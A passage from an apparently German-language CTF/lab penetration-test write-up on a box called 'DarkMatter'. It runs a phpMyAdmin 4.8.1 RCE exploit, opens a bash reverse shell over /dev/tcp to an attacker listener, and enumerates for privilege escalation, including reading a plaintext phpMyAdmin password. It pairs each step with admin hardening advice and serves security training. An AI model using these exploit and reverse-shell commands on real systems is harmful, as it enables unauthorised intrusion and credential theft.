+                 Ich habe das heruntergeladene Exploit-Skript in einen besser lesbaren Namen umbenannt.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">mv 50457.py phpMyAdmin.py</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `mv 50457.py phpMyAdmin.py` benennt das heruntergeladene Exploit-Skript um. Dies ist ein einfacher organisatorischer Schritt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Funktionell ein trivialer Schritt. Der Name des Skripts hat keinen Einfluss auf seine Funktionalität.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stelle sicher, dass du den korrekten Dateinamen des Skripts für die Ausführung verwendest.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung.
+            </p>
+
+             <p>
+                 Ich habe das Python-Exploit-Skript (`phpMyAdmin.py`) verwendet, um Remote Code Execution auf dem Zielsystem zu erreichen. Zuerst habe ich einen einfachen Befehl (`whoami`) ausgeführt, um den Erfolg zu verifizieren und die Berechtigungen des Webserver-Benutzers zu bestimmen.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">IP=&quot;192.168.2.54&quot;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">PORT=&quot;80&quot;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">PATH=&quot;/phpmyadmin&quot;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">USER=&quot;pma&quot; </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">PASS=&apos;th3-!llum!n@t0r&apos;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">CMD=&quot;whoami&quot;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">/usr/bin/python3 phpMyAdmin.py $IP $PORT $PATH $USER $PASS &quot;$CMD&quot;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+/root/phpMyAdmin.py:29: SyntaxWarning: invalid escape sequence &apos;\s&apos;
+  s = re.search(&apos;token&quot;\s*value=&quot;(.*?)&quot;&apos;, content)
+/root/phpMyAdmin.py:50: SyntaxWarning: invalid escape sequence &apos;\d&apos;
+  s = re.search(&apos;PMA_VERSION:&quot;(\d+\.\d+\.\d+)&quot;&apos;, content)
+/root/phpMyAdmin.py:64: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  s = re.search(&apos;logged_in:(\w+),&apos;, content)
+<span class="password">www-data</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe Umgebungsvariablen (`IP`, `PORT`, `PATH`, `USER`, `PASS`, `CMD`) gesetzt, um die Parameter für das Python-Exploit-Skript festzulegen. Der `USER` und `PASS` sind hier irrelevant, da der Exploit unauthentifiziert ist, aber das Skript benötigt diese Eingaben. Ich habe das Skript mit Python3 ausgeführt und den Befehl `whoami` übergeben. Die Ausgabe `<span class="password">www-data</span>` zeigt, dass der Befehl erfolgreich ausgeführt wurde und der Webserver-Benutzer `www-data` ist. Die `SyntaxWarning`s sind Hinweise des Python-Interpreters im Skript-Code und können ignoriert werden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die unauthentifizierte RCE in phpMyAdmin Version 4.8.1 ist nutzbar, und ich kann beliebige Befehle auf dem Zielsystem mit den Berechtigungen des `www-data` Benutzers ausführen. Dies ist der erfolgreiche Initial Access Vektor.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da RCE als `www-data` möglich ist, besteht der nächste Schritt darin, eine persistente Shell auf das Zielsystem zu erhalten. Generiere eine Reverse Shell Payload und nutze das Exploit-Skript, um sie auf dem Zielsystem auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Diese Demonstration zeigt die schwerwiegenden Auswirkungen der Schwachstelle. Stelle sicher, dass phpMyAdmin umgehend auf eine nicht anfällige Version aktualisiert wird. Überprüfe die Berechtigungen des Benutzers `www-data`.
+            </p>
+
+             <p>
+                 Ich habe einen weiteren Befehl (`pwd`) über das Exploit-Skript ausgeführt, um das aktuelle Arbeitsverzeichnis des Webserver-Benutzers zu sehen, was bei der Navigation im Dateisystem helfen kann.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">CMD=&quot;pwd&quot;;/usr/bin/python3 phpMyAdmin.py $IP $PORT $PATH $USER $PASS &quot;$CMD&quot;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+/root/phpMyAdmin.py:29: SyntaxWarning: invalid escape sequence &apos;\s&apos;
+  s = re.search(&apos;token&quot;\s*value=&quot;(.*?)&quot;&apos;, content)
+/root/phpMyAdmin.py:50: SyntaxWarning: invalid escape sequence &apos;\d&apos;
+  s = re.search(&apos;PMA_VERSION:&quot;(\d+\.\d+\.\d+)&quot;&apos;, content)
+/root/phpMyAdmin.py:64: SyntaxWarning: invalid escape sequence &apos;\w&apos;
+  s = re.search(&apos;logged_in:(\w+),&apos;, content)
+<span class="password">/usr/share/phpmyadmin</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die `CMD` Variable auf `pwd` gesetzt und das Exploit-Skript erneut ausgeführt. Die Ausgabe `<span class="password">/usr/share/phpmyadmin</span>` zeigt, dass das aktuelle Arbeitsverzeichnis des `www-data` Benutzers, wenn der Exploit ausgeführt wird, `/usr/share/phpmyadmin` ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Kenntnis des aktuellen Arbeitsverzeichnisses ist hilfreich für die Navigation im Dateisystem, wenn ich später eine Shell erhalte. Es ist das Standardinstallationsverzeichnis von phpMyAdmin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalte dieses Verzeichnis im Hinterkopf. Beginne die Dateisystem-Enumeration von hier aus oder vom Root (`/`), wenn du eine Shell hast.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass das phpMyAdmin-Verzeichnis und seine Inhalte nur die notwendigen Berechtigungen haben.
+            </p>
+
+             <p>
+                 Um interaktiven Zugriff zu erhalten, habe ich eine Reverse Shell Payload vorbereitet und das Exploit-Skript verwendet, um sie auf dem Zielsystem auszuführen und eine Verbindung zu einem Netcat-Listener auf meinem Angreifersystem aufzubauen.
+             </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="command">IP=&quot;192.168.2.54&quot;</span>
+<span class="command">PORT=&quot;80&quot;</span>
+<span class="command">PATH=&quot;/phpmyadmin&quot;</span>
+<span class="command">USER=&quot;pma&quot;</span>
+<span class="command">PASS=&apos;th3-!llum!n@t0r&apos;</span>
+<span class="command">CMD=&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/192.168.2.199/9001 0&gt;&amp;1&apos;&quot;</span>
+
+<span class="command">/usr/bin/python3 phpMyAdmin.py $IP $PORT $PATH &quot;$USER&quot; &quot;$PASS&quot; &quot;$CMD&quot;</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nc -lvnp 9001</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 9001 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.54] 36746</span>
+bash: cannot set terminal process group (535): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="password">www-data@DarkMatter:/usr/share/phpmyadmin$</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die `CMD` Variable auf eine standardmäßige Bash Reverse Shell Payload gesetzt: `"bash -c 'bash -i >& /dev/tcp/192.168.2.199/9001 0>&1'"`. Diese Payload weist das System an, eine interaktive Bash-Shell zu starten und deren Input, Output und Error-Streams über eine TCP-Verbindung zurück an meine IP-Adresse (192.168.2.199) auf Port 9001 umzuleiten. Bevor ich das Exploit-Skript ausgeführt habe, habe ich einen Netcat-Listener (`nc -lvnp 9001`) auf meinem Angreifersystem gestartet, um die eingehende Verbindung zu empfangen. Nach dem Ausführen des Exploit-Skripts meldete der Netcat-Listener eine eingehende Verbindung vom Zielsystem, und ich erhielt eine Shell. Der Prompt `<span class="password">www-data@DarkMatter:/usr/share/phpmyadmin$</span>` bestätigt, dass ich eine interaktive Shell als Benutzer `www-data` mit dem aktuellen Arbeitsverzeichnis `/usr/share/phpmyadmin` erhalten habe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Initial Access war erfolgreich. Ich habe nun vollständigen Kommandozeilenzugriff auf das Zielsystem mit den Rechten des Webserver-Benutzers `www-data`. Dies markiert den Abschluss der Initial Access Phase und den Beginn der Privilege Escalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell umgehend. Beginne mit der systeminternen Aufklärung (Enumeration) als Benutzer `www-data`, um Informationen für eine mögliche Privilege Escalation zu sammeln. Prüfe SUID/SGID-Binaries, Sudo-Berechtigungen, Cronjobs, Dateisystemberechtigungen, installierte Pakete und Konfigurationsdateien.
+                <br><strong>Empfehlung (Admin):</strong> Untersuche die Ursache der RCE-Schwachstelle (veraltetes phpMyAdmin) und führe eine gründliche Forensik durch. Ändere alle auf dem System gespeicherten Anmeldedaten. Implementiere eine umfassende Sicherheitsüberwachung und beschränke ausgehenden Netzwerkverkehr.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p>
+                Nachdem ich eine Shell als Benutzer `www-data` erhalten hatte, bestand der nächste Schritt darin, Informationen über das System zu sammeln, die mir helfen könnten, meine Berechtigungen zu erweitern und Root-Zugriff zu erlangen. Ich begann mit der systeminternen Aufklärung. Zuerst habe ich die Shell stabilisiert (dieser Schritt ist oft notwendig, wird hier aber nicht explizit im Text gezeigt, ist aber Standardpraxis) und begann, das Home-Verzeichnis aufzulisten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/usr/share/phpmyadmin$</span> <span class="command">ls /home/</span>
+<span class="command">darkenergy</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">ls -la /home/darkenergy/</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+ls: cannot open directory &apos;/home/darkenergy/&apos;: <span class="password">Permission denied</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt des `/home`-Verzeichnisses aufgelistet (`ls /home/`) und dabei ein Benutzerverzeichnis namens `<span class="command">darkenergy</span>` gefunden. Dies identifiziert `darkenergy` als einen regulären Benutzer auf dem System. Ein anschließender Versuch, das Home-Verzeichnis von `darkenergy` aufzulisten (`ls -la /home/darkenergy/`), schlug mit der Fehlermeldung "Permission denied" fehl, was darauf hindeutet, dass der Benutzer `www-data` keine ausreichenden Berechtigungen hat, um dieses Verzeichnis einzusehen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Identifizierung des Benutzers `darkenergy` ist wichtig. Regäre Benutzerkonten sind oft Ziele für Privilege Escalation. Die Tatsache, dass das Home-Verzeichnis nicht für `www-data` zugänglich ist, ist eine gute Sicherheitseinstellung. Der Benutzername `<span class="command">darkenergy</span>` könnte ein Ziel für Passwort-Angriffe werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche weiter nach Informationen über den Benutzer `darkenergy` im Dateisystem. Versuche, Anmeldedaten für diesen Benutzer zu finden oder zu knacken. Die in `/p4ssw0rd.txt` gefundenen Anmeldedaten könnten relevant sein.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass die Berechtigungen für Home-Verzeichnisse korrekt gesetzt sind, um unbefugten Zugriff durch andere Benutzer zu verhindern.
+            </p>
+
+            <p>
+                Ich habe die Sudo-Berechtigungen des aktuellen Benutzers `www-data` geprüft, um festzustellen, ob ein einfacher Weg zur Rechteausweitung über Sudo existiert.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/usr/share/phpmyadmin$</span> <span class="command">sudo -l</span>
+<span class="password">[sudo] password for www-data:</span>
+<span class="password">sudo: a password is required</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `sudo -l` listet die Sudo-Berechtigungen des aktuellen Benutzers auf. Die Ausgabe zeigt, dass für `www-data` ein Passwort für die Ausführung von Sudo-Befehlen erforderlich ist. Da ich das Passwort für `www-data` nicht kenne, ist eine Privilege Escalation direkt über Sudo für diesen Benutzer nicht möglich.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Anforderung eines Passworts für Sudo-Befehle für `www-data` ist eine gute Sicherheitseinstellung. Es verhindert eine einfache Privilege Escalation, falls ein Angreifer eine Shell als `www-data` erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da Sudo für `www-data` ein Passwort erfordert, konzentriere dich auf andere Privilege Escalation-Vektoren wie SUID-Binaries, Cronjobs, unsichere Konfigurationsdateien oder schwache Passwörter für andere Benutzer.
+                <br><strong>Empfehlung (Admin):</strong> Verifiziere, dass der Benutzer `www-data` keine Sudo-Berechtigungen ohne Passwort hat. Erwäge, Sudo-Berechtigungen für Webserver-Benutzer generell einzuschränken.
+            </p>
+
+            <p>
+                Ein gängiger Vektor für Privilege Escalation sind SUID-Binaries. Ich suchte auf dem Dateisystem nach Dateien mit diesem speziellen Berechtigungsbit, das es erlaubt, Programme mit den Rechten des Dateibesitzers (oft Root) auszuführen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/usr/share/phpmyadmin$</span> <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null </span>
+   <span class="command">134187     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">141514    472 -rwsr-xr-x   1 root     root         481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign</span>
+   <span class="command">129887     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd</span>
+   <span class="command">133902     36 -rwsr-xr-x   1 root     root          35040 Jul 28  2021 /usr/bin/umount</span>
+   <span class="command">133374     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp</span>
+   <span class="command">129888     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd</span>
+   <span class="command">134084    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo</span>
+   <span class="command">133900     56 -rwsr-xr-x   1 root     root          55528 Jul 28  2021 /usr/bin/mount</span>
+   <span class="command">133533     72 -rwsr-xr-x   1 root     root          71912 Jul 28  2021 /usr/bin/su</span>
+   <span class="command">129885     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh</span>
+   <span class="command">129884     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `find / -type f -perm -4000 -ls 2&gt;/dev/null` suchte rekursiv im Dateisystem nach SUID-Dateien. Die Ausgabe listet standardmäßige SUID-Binaries wie `mount`, `su`, `passwd`, `sudo` etc. auf. Es gibt keine offensichtlich ungewöhnlichen SUID-Binaries, die direkt über GTFOBins oder ähnliche einfache Methoden auszunutzen wären.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Liste der SUID-Binaries enthält keine sofort offensichtlichen Exploits für Privilege Escalation. Standard-Binaries mit SUID sind in der Regel gehärtet. Dies bedeutet, dass die Privilege Escalation wahrscheinlich nicht über einen einfachen SUID-Binary-Missbrauch erfolgen wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Obwohl kein offensichtlicher SUID-Exploit gefunden wurde, halte die Liste im Hinterkopf und prüfe sie gegen neuere oder komplexere Techniken, falls andere Wege fehlschlagen. Konzentriere dich in der Zwischenzeit auf andere Vektoren.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe regelmäßig SUID-Binaries und entferne das SUID-Bit von Programmen, die es nicht unbedingt benötigen.
+            </p>
+
+            <p>
+                Ich habe das `/opt` Verzeichnis untersucht, da es oft benutzerdefinierte Skripte oder Anwendungen enthält, die für die Privilege Escalation relevant sein könnten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/usr/share/phpmyadmin$</span> <span class="command">ls -la /opt/</span>
+<span class="command">total 2444</span>
+<span class="command">drwxr-xr-x  2 root       root          4096 Nov 21  2021 .</span>
+<span class="command">drwxr-xr-x 18 root       root          4096 Nov 10  2021 ..</span>
+<span class="password">-rwxrwxr--  1 darkenergy darkenergy      59 Nov 14  2021 note.<span class="command">txt</span></span>
+<span class="password">-rwxrwxrwx  1 root       root       2489009 Nov 21  2021 website.<span class="command">zip</span></span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt von `/opt/` aufgelistet (`ls -la /opt/`). Ich fand zwei interessante Dateien, die für den Benutzer `www-data` lesbar sind: `<span class="password">note.txt</span>` (Besitzer `darkenergy`) und `<span class="password">website.zip</span>` (Besitzer `root`, Schreibberechtigung für alle). Die `note.txt` könnte Hinweise enthalten, und die große `website.zip`-Datei ist verdächtig und sollte untersucht werden. Die Berechtigungen von `website.zip` (`-rwxrwxrwx`) sind sehr permissiv.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden der lesbaren `note.txt` und der welt-schreibbaren `website.zip` (obwohl wir "welt-schreibbar" noch verifizieren müssen, die `-rwxrwxrwx` Berechtigungen deuten darauf hin) in `/opt/` sind wichtige Funde. `note.txt` könnte einen direkten Hinweis enthalten, und `website.zip` könnte sensible Daten oder Konfigurationsdateien enthalten. Die Berechtigungen von `website.zip` sind potenziell eine Schwachstelle, obwohl `www-data` sie "nur" lesen kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lese den Inhalt von `note.txt` sofort. Lade `website.zip` herunter und untersuche sie lokal auf Konfigurationsdateien, Anmeldedaten oder andere interessante Inhalte.
+                <br><strong>Empfehlung (Admin):</strong> Entferne `note.txt` oder schränke ihre Berechtigungen ein. Stelle sicher, dass Dateien in `/opt/` nicht unnötig weit lesbar sind. Korrigiere die sehr permissiven Berechtigungen für `website.zip`.
+            </p>
+
+            <p>
+                Ich habe den Inhalt der Datei `note.txt` in `/opt/` gelesen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/opt$</span> <span class="command">cat /opt/note.txt </span>
+<span class="password">www-data can read root&apos;s important.<span class="command">txt</span> file but idk how ;(</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt von `note.txt` ist ein direkter Hinweis: "`www-data can read root's important.txt file but idk how ;(`". Dies deutet stark darauf hin, dass es einen Mechanismus gibt, der es dem Benutzer `www-data` erlaubt, eine Datei im Home-Verzeichnis von Root (`/root/`) zu lesen (`important.txt`), obwohl die Standardberechtigungen dies verhindern sollten. Der Benutzer `darkenergy`, dem die Notiz gehört, wusste nicht, wie dieser Zugriff möglich ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Absolut kritischer Hinweis! Es gibt einen bisher unbekannten Weg zur Umgehung von Dateisystemberechtigungen, der es `www-data` erlaubt, eine Root-Datei zu lesen. Die Datei `important.txt` im Root-Verzeichnis ist offensichtlich von Bedeutung und könnte Anmeldedaten oder andere sensible Informationen enthalten, die zur Rechteausweitung notwendig sind.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach Sicherheitslücken oder Fehlkonfigurationen, die es `www-data` erlauben, Dateien außerhalb seines üblichen Berechtigungskontextes zu lesen. Der Hinweis auf `/root/important.txt` ist das primäre Ziel. Mögliche Vektoren könnten Capabilities, unsichere Cronjobs, anfällige SUID-Binaries, oder Kernel-Schwachstellen sein. Angesichts des "Hard" Levels ist eine Kernel-Schwachstelle wahrscheinlich. Überprüfe die Systeminformationen (Kernel-Version) erneut.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfe sofort die Berechtigungen für `/root/important.txt` und das `/root/` Verzeichnis. Suche nach ungewöhnlichen Capabilities oder anderen Mechanismen, die Dateizugriff auf `/root/` für andere Benutzer ermöglichen könnten.
+            </p>
+
+            <p>
+                Ich habe die Konfigurationsdatei von phpMyAdmin, `config.inc.php`, untersucht. Diese Datei enthält oft wichtige Einstellungen und manchmal auch Anmeldedaten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/usr/share/phpmyadmin$</span> <span class="command">cat /usr/share/phpmyadmin/config.inc.<span class="command">php</span></span>
+<span class="command"> </span>
+<span class="command">$cfg[&apos;blowfish_secret&apos;] = &apos;<span class="command">iSUSuJycUGiRHWu7e88ufIpNKCDglTpC</span>&apos;; /* YOU MUST FILL IN THIS FOR COOKIE AUTH! */</span>
+
+<span class="command">/**</span>
+<span class="command"> * Servers configuration</span>
+<span class="command"> */</span>
+<span class="command">$i = 0;</span>
+
+<span class="command">/**</span>
+<span class="command"> * First server</span>
+<span class="command"> */</span>
+<span class="command">$i++;</span>
+<span class="command">/* Authentication <span class="command">TYPE</span> */</span>
+<span class="command">$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;cookie&apos;;</span>
+<span class="command">/* Server parameters */</span>
+<span class="command">$cfg[&apos;Servers&apos;][$i][&apos;host&apos;] = &apos;localhost&apos;;</span>
+<span class="command">$cfg[&apos;Servers&apos;][$i][&apos;compress&apos;] = false;</span>
+<span class="command">$cfg[&apos;Servers&apos;][$i][&apos;AllowNoPassword&apos;] = false;</span>
+
+<span class="command">/**</span>
+<span class="command"> * phpMyAdmin configuration storage settings.</span>
+<span class="command"> */</span>
+
+<span class="command">/* User used to manipulate with storage */</span>
+<span class="command">// $cfg[&apos;Servers&apos;][$i][&apos;controlhost&apos;] = &apos;&apos;;</span>
+<span class="command">// $cfg[&apos;Servers&apos;][$i][&apos;controlport&apos;] = &apos;&apos;;</span>
+<span class="command">$cfg[&apos;Servers&apos;][$i][&apos;controluser&apos;] = &apos;pma&apos;;</span>
+<span class="password">$cfg[&apos;Servers&apos;][$i][&apos;controlpass&apos;] = &apos;th3-!llum!n@t0r&apos;;</span>
+<span class="command">...</span>
+<span class="command">..</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt von `/usr/share/phpmyadmin/config.inc.php` ausgelesen. Die Datei enthält Konfigurationseinstellungen für phpMyAdmin. Besonders interessant sind die Einträge für den Kontrollbenutzer (`controluser`) und sein Passwort (`controlpass`). Der Benutzer ist `pma`, und das Passwort ist `<span class="password">th3-!llum!n@t0r</span>`. Dies ist dasselbe Passwort, das ich zuvor in `/p4ssw0rd.txt` gefunden hatte. Dies bestätigt, dass das in der Klartextdatei gefundene Passwort für den phpMyAdmin-Kontrollbenutzer `pma` ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden des Passworts für den `pma`-Benutzer in der phpMyAdmin-Konfigurationsdatei bestätigt die Korrektheit des aus `/p4ssw0rd.txt` extrahierten Passworts und seine Zuordnung zum Benutzer `pma`. Dies ist eine weitere Bestätigung der mangelhaften Sicherheitspraktiken auf diesem System (Klartextpasswörter). Für die Privilege Escalation ist es sekundär, da ich bereits RCE als `www-data` habe, aber es liefert gültige Datenbank-Zugangsdaten für den `pma`-Kontrollbenutzer.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Anmeldedaten `pma:th3-!llum!n@t0r` können nun für den Login in phpMyAdmin verwendet werden, falls der unauthentifizierte Exploit fehlschlagen würde. Sie sind aber für die aktuelle RCE-basierte Strategie nicht zwingend notwendig.
+                <br><strong>Empfehlung (Admin):</strong> Ändere das Passwort für den `pma`-Benrollbenutzer und speichere es nicht im Klartext in Konfigurationsdateien. Sichere die `config.inc.php` Datei stärker ab.
+            </p>
+
+            <p>
+                Ich habe den Inhalt der Datei `website.zip` in `/opt/` untersucht, indem ich ihren Inhalt mit `unzip -l` auflistete.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/opt$</span> <span class="command">unzip -l /opt/website.<span class="command">zip</span></span>
+<span class="command">Archive:  /opt/website.<span class="command">zip</span></span>
+  <span class="command">Length      Date    Time    Name</span>
+<span class="command">---------  ---------- -----   ----</span>
+        <span class="command">0  2021-11-21 00:16   darkmatter/</span>
+      <span class="command">607  2021-11-14 06:27   darkmatter/status.<span class="command">php</span></span>
+     <span class="command">6172  2021-11-14 06:31   darkmatter/update.<span class="command">php</span></span>
+     <span class="command">3416  2021-11-21 00:16   darkmatter/login.<span class="command">php</span></span>
+     <span class="command">2854  2021-11-14 06:27   darkmatter/profile.<span class="command">php</span></span>
+     <span class="command">6427  2021-11-14 06:27   darkmatter/blog.<span class="command">php</span></span>
+     <span class="command">3265  2021-11-14 06:27   darkmatter/navbar.<span class="command">php</span></span>
+        <span class="command">0  2021-11-14 06:27   darkmatter/upload/</span>
+  <span class="command">1345261  2021-11-14 06:27   darkmatter/upload/dp.<span class="command">jpg</span>.bak</span>
+    <span class="command">50193  2021-11-14 06:27   darkmatter/upload/dp.<span class="command">jpg</span></span>
+      <span class="command">319  2021-11-14 06:27   darkmatter/conn.<span class="command">php</span></span>
+       <span class="command">...</span>
+       <span class="command">..</span>
+      <span class="command">350  2021-11-14 06:27   darkmatter/footer.<span class="command">php</span></span>
+      <span class="command">476  2021-11-14 06:27   darkmatter/index.<span class="command">php</span></span>
+     <span class="command">2464  2021-11-14 06:27   darkmatter/home.<span class="command">php</span></span>
+     <span class="command">6315  2021-11-21 00:16   darkmatter/register.<span class="command">php</span></span>
+      <span class="command">272  2021-11-14 06:27   darkmatter/header.<span class="command">php</span></span>
+      <span class="command">108  2021-11-14 06:27   darkmatter/logout.<span class="command">php</span></span>
+       <span class="command">...</span>
+       <span class="command">..</span>
+     <span class="command">1669  2021-11-14 06:27   darkmatter/manage.<span class="command">php</span></span>
+<span class="command">---------                     -------</span>
+  <span class="command">5556603                     44 files</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `unzip -l /opt/website.zip` listet den Inhalt des ZIP-Archivs auf, ohne es zu entpacken. Die Ausgabe zeigt eine Dateistruktur im Ordner `darkmatter/`, die viele PHP-Dateien (`login.php`, `register.php`, `conn.php`, etc.) und Verzeichnisse (`upload/`, `images/`) enthält. Dies ist der Quellcode der Webanwendung. Die Datei `conn.php` ist potenziell interessant, da sie Datenbankverbindungsdetails enthalten könnte. Es gibt auch Backup-Dateien wie `dp.jpg.bak`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden des Quellcodes der Webanwendung in `/opt/` ist ein wertvoller Fund. Der Code kann offline auf Schwachstellen (wie weitere Injections, schwache Kryptographie, hartkodierte Anmeldedaten) analysiert werden. Die Datei `conn.php` und alle Dateien, die Anmeldedaten enthalten könnten, sind von besonderem Interesse.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lade die Datei `website.zip` auf dein Angreifersystem herunter und entpacke sie lokal. Führe einen Code-Audit durch, insbesondere der Datei `conn.php` und anderer relevanter Skripte, um nach Anmeldedaten oder anderen Schwachstellen im Code zu suchen.
+                <br><strong>Empfehlung (Admin):</strong> Speichere Quellcode-Backups nicht auf Produktionssystemen, insbesondere nicht in öffentlich lesbaren Verzeichnissen wie `/opt/` (für den `www-data` Benutzer).
+            </p>
+
+            <p>
+                Als letzten Schritt bei der systeminternen Aufklärung habe ich die genaue Betriebssystemversion und den Kernel überprüft, da dies in Kombination mit dem Hinweis auf die Lese-Schwachstelle für Root-Dateien einen Kernel-Exploit als möglichen Vektor nahelegt.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
